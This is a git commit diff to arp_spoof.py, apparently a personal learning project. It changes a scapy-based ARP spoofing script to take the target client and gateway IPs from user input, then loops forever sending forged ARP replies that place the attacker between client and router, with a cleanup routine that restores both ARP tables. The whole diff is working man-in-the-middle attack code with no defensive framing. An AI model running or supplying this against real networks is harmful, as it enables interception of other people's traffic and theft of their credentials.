1d06d8903f7490ac2230a56983093b6ed20d1543
Saad Shahzad <spider32277223@gmail.com>
2020-03-27 11:04:50 -0400

    User Input Functionality Added

--- arp_spoof.py
+++ arp_spoof.py
@@ -25,22 +25,25 @@ def arp_restore(destination_ip, source_ip):
     scapy.send(packet, count=4, verbose=False) # will send packet 4 times to make sure to correct arp table
 
 # Taking user input
-
-
+client_ip = input(">>Enter client IP: ")
+gateway_ip = input(">>Enter Network IP: ")
 
 # To continue the spoofing packets
 try:
     # To initialize the number of packets send
     packet_count = 0
     while True:
-        spoofing("192.168.100.37", "192.168.100.1") # will spoof the client by telling that i am the router
-        spoofing("192.168.100.1", "192.168.100.37") # will spoof the router by telling i am the client
+        spoofing(client_ip, gateway_ip) # will spoof the client by telling that i am the router
+        spoofing(gateway_ip, client_ip) # will spoof the router by telling i am the client
         packet_count = packet_count + 2
+
         print("\r[+] Packet Sent Successfully: " + str(packet_count), end=""),
         time.sleep(2) # will sleep for 2 sec. In order to not send to many packets
+
 except KeyboardInterrupt:
     print("\n[-] Stopping Arp Spoofing. CTRL + C Detected ....... Resetting ARP tables ...... Please Wait")
-    arp_restore("192.168.100.37", "192.168.100.1")
+    arp_restore(client_ip, gateway_ip) # Restoring client ip
+    arp_restore(gateway_ip, client_ip) # Restoring router ip
 
 # Use the below functions in case if it doesn't work using the end function in line 28 via python3
 # sys.stdout.flush()
